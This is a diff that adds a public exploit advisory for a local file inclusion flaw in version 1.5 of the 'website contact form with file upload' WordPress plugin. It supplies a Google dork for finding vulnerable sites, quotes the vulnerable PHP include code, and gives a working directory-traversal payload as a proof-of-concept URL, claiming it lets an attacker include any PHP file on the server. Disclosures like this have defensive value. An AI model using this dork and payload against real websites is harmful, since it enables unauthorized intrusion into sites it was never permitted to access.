@@ -1,0 +1,27 @@
+# Exploit Title: website contact form with file upload 1.5 Exploit Local File Inclusion
+# Google Dork: inurl:"/plugins//website-contact-form-with-file-upload/"
+# Date: 07.05.2015
+# Exploit Author: T3N38R15
+# Software Link: https://wordpress.org/plugins/website-contact-form-with-file-upload/
+# Version: 1.5
+# Tested on: Windows/Linux
+
+The affected file is /wp-content/plugins/website-contact-form-with-file-upload/lib/wide-image/image-processor.php
+it include the file /wp-content/plugins/website-contact-form-with-file-upload/lib/wide-image/helpers/demo.php
+and at the line 23-26 are the inclusion.
+
+
+			$file = LIB_PATH . '/filters/' . $name . '.php';
+			if (!file_exists($file))
+				throw new Exception("Invalid demo: {$name}");
+			include($file);
+
+
+The exploit can be used like that : /wp-content/plugins/website-contact-form-with-file-upload/lib/wide-image/image-processor.php?demo=../test
+This version would include the test.php file in the same directory because we need to back navigate from the directory ./filters/../test.php
+Now we can include all php files on the system.
+
+Proof of concept : http://localhost/wp-content/plugins/website-contact-form-with-file-upload/lib/wide-image/image-processor.php?demo=../test
+
+Greets to Team Madleets/leets.pro
+Regards T3N38R15
